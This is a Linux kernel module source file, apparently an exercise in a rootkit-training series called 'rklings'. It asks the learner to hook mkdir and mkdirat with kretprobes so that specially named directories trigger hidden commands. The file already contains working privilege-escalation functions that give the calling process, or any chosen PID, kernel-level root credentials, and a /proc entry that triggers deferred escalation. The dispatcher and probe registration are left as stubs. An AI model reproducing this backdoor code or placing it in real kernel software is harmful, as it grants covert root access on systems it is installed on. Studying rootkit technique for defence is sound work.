// SPDX-License-Identifier: GPL-2.0
//
// Your task: upgrade from kprobe to kretprobe and build a command
// dispatcher that routes "rklings.<cmd>[.<arg>]" mkdir names to
// handler functions (ping, status, escalate). Hook both
// __x64_sys_mkdir and __x64_sys_mkdirat.
//
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static unsigned int escalation_count;
static int deferred_pid;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

/* Command handlers: ping, status, escalate.
 * Each takes (const char *arg) and returns int. */

/* Dispatcher: parse "rklings.<cmd>[.<arg>]" and route to the handler. */

/* kretprobe entry/return handlers for mkdir and mkdirat.
 * Entry: intercept, dispatch, suppress. Return: override the result. */

/* Two kretprobes: one for mkdir, one for mkdirat. */

static int rk_proc_show(struct seq_file *m, void *v)
{
	rk_try_deferred();
	if (deferred_pid > 0)
		seq_printf(m, "deferred: %d\n", deferred_pid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	return 0;
}

static int __init rk_init(void)
{
	/* Register both kretprobes, create /proc/rklings. Roll back on failure. */
	return 0;
}

static void __exit rk_exit(void)
{
	/* Tear down proc entry and both kretprobes. */
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
